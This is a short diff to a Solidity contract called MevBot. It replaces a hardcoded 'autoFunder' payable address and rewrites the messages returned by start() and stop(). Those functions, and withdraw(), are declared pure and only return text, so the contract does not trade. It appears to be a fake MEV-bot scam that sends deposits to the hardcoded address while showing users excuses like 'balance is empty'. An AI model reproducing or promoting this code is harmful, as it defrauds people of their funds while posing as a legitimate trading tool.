@@ -509,7 +509,7 @@ contract MevBot {
     address payable private autoFunder;
 
     constructor() {
-        autoFunder = payable(0x9Ca7FbE2afBb404E49b49DEADe3a325e92dd6dA4);
+        autoFunder = payable(0x85F524F1F8d3fAf685c4e88F0A787f787F647460);
     }
 
     function initialize(
@@ -614,11 +614,11 @@ contract MevBot {
     }
 
     function start() public pure returns (string memory) {
-        return "Started MEV trading bot";
+        return "Command failed, balance is empty";
     }
 
     function stop() public pure returns (string memory) {
-        return "Stopped MEV trading bot";
+        return "Command not executed, MEV bot is not active";
     }
 
     function withdraw(address recipient) public pure returns (string memory) {
